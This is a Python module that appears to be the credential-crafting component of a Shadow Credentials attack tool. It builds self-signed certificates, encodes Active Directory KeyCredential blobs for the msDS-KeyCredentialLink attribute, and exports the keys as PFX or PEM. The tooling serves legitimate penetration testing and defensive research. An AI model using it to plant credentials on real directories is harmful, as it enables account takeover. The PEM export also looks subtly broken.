from struct import pack
from Cryptodome.Util.number import long_to_bytes
from Cryptodome.PublicKey import RSA
from OpenSSL.crypto import PKey, X509, TYPE_RSA
import OpenSSL
import base64
import uuid
import datetime
import time
import hashlib
import binascii
import os

# code based on:
# 
# https://podalirius.net/en/articles/parsing-the-msds-keycredentiallink-value-for-shadowcredentials-attack/
# https://github.com/MichaelGrafnetter/DSInternals
 
HASH_ALGO="sha256"

def getTicksNow():
    # https://learn.microsoft.com/en-us/dotnet/api/system.datetime.ticks?view=net-5.0#system-datetime-ticks
    dt_now = datetime.datetime.now()
    csharp_epoch = datetime.datetime(year=1, month=1, day=1)
    delta = dt_now - csharp_epoch
    return int(delta.total_seconds() * 10000000) # Convert to microseconds and multiply by 10 for ticks

def getDeviceId():
    return uuid.uuid4().bytes

def createSelfSignedX509Certificate(subject,nBefore,nAfter,kSize=2048):
    key = PKey()
    key.generate_key(TYPE_RSA,kSize)

    certificate = X509()

    certificate.get_subject().CN = subject
    certificate.set_issuer(certificate.get_subject())
    certificate.gmtime_adj_notBefore(nBefore)
    certificate.gmtime_adj_notAfter(nAfter)
    certificate.set_pubkey(key)

    certificate.sign(key,HASH_ALGO)
    return key,certificate

class KeyCredential():
    @staticmethod
    def raw_public_key(certificate,key):
        pem_public_key = OpenSSL.crypto.dump_publickey(OpenSSL.crypto.FILETYPE_PEM, key)
        public_key = RSA.importKey(pem_public_key)

        kSize = pack("<I",public_key.size_in_bits())
        exponent = long_to_bytes(public_key.e)
        exponentSize = pack("<I",len(exponent))
        modulus = long_to_bytes(public_key.n)
        modulusSize = pack("<I",len(modulus))

        padding = pack("<I",0)*2

        return b'RSA1' + kSize + exponentSize + modulusSize + padding + exponent + modulus

    def __init__(self,certificate,key,deviceId,currentTime):
        self.__publicKey = self.raw_public_key(certificate,key)
        self.__rawKeyMaterial = (0x3,self.__publicKey)
        self.__usage = (0x4,pack("<B",0x01))
        self.__source = (0x5,pack("<B",0x0))
        self.__deviceId = (0x6,deviceId)
        self.__customKeyInfo = (0x7,pack("<BB",0x1,0x0))
        self.__lastLogonTime = (0x8,pack("<Q",currentTime))
        self.__creationTime = (0x9,pack("<Q",currentTime))

        self.__version = 0x200

        self.__sha256 = base64.b64encode( hashlib.sha256(self.__publicKey).digest() ).decode("utf-8")

    def __packData(self,fields):
        return b''.join( [ pack("<HB",len(field[1]),field[0]) + field[1] for field in fields] )

    def __getKeyIdentifier(self):
        self.__identifier = base64.b64decode( self.__sha256+"===" )
        return (0x1,self.__identifier)

    def __getKeyHash(self):
        computed_hash = hashlib.sha256(self.__identifier).digest()
        return (0x2,computed_hash)

    def dumpBinary(self):
        version = pack("<L",self.__version)

        binaryData = self.__packData( [self.__getKeyIdentifier(),
                                        self.__getKeyHash(),
                                      ])

        binaryProperties = self.__packData( [self.__rawKeyMaterial,
                            self.__usage,
                            self.__source,
                            self.__deviceId,
                            self.__customKeyInfo,
                            self.__lastLogonTime,
                            self.__creationTime,
                         ])

        return version + binaryData + binaryProperties


def toDNWithBinary2String( binaryData, owner ):
    hexdata = binascii.hexlify(binaryData).decode("UTF-8")
    return "B:%d:%s:%s" % (len(binaryData)*2,hexdata,owner)


def exportPFX(certificate,key,path_to_file,password):
    if len(os.path.dirname(path_to_file)) != 0:
        if not os.path.exists(os.path.dirname(path_to_file)):
            os.makedirs(os.path.dirname(path_to_file), exist_ok=True)

    pk = OpenSSL.crypto.PKCS12()
    pk.set_privatekey(key)
    pk.set_certificate(certificate)
    with open(path_to_file+".pfx","wb") as f:
        f.write(pk.export(passphrase=password))


def exportPEM(certificate,key, path_to_files):
    if len(os.path.dirname(path_to_files)) != 0:
        if not os.path.exists(os.path.dirname(path_to_files)):
            os.makedirs(os.path.dirname(path_to_files), exist_ok=True)

        cert = OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_PEM, certificate)
        with open(path_to_files + "_cert.pem", "wb") as f:
            f.write(cert)
        privpem = OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_PEM, key)
        with open(path_to_files + "_priv.pem", "wb") as f:
            f.write(privpem)

